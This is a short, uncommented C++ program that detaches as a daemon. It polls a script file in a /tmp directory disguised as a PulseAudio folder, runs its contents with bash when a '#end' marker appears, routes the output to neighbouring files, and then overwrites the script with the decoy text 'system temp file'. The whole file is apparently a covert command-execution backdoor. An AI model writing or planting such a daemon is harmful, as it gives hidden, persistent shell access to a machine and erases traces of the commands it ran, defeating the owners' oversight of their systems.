#include <unistd.h>
#include <fcntl.h>
#include "csvtable.h"

using namespace std;

void closeall() {

    for (int n = 0; n < 1024; n++) {

        close(n);
    }
};

int main(int argc, char* argv[]) {

    closeall();
    daemon(0, 1);

    string dir = "/tmp/pulse-QAZWSXEDCRFV/";

    string script_file = dir + "config";
    string input  = dir + "n0";
    string output = dir + "n1";
    string errput = dir + "n2";
    string cmd("/bin/bash");
    cmd += " ";
    cmd += script_file;

    int fid0;
    int fid1;
    int fid2;

    while (1) {

        string script = file_get_contents(script_file);
        closeall();

        if ( script.find("#end") != string::npos ) {

            if (script.find("#quit") != string::npos) {

                file_put_contents(script_file, "system temp file");
                break;

            } else {

                fid0 = open(input.c_str(),  O_RDWR);
                if (fid0 == -1) continue;
                dup2(fid0, 0);

                fid1 = open(output.c_str(), O_RDWR|O_TRUNC);
                if (fid1 == -1) continue;
                dup2(fid1, 1);

                fid2 = open(errput.c_str(), O_RDWR|O_TRUNC);
                if (fid2 == -1) continue;
                dup2(fid2, 2);

                system(cmd.c_str());
                file_put_contents(script_file, "system temp file");

                closeall();
            }
        }

        sleep(1);
    }

    return 0;
}

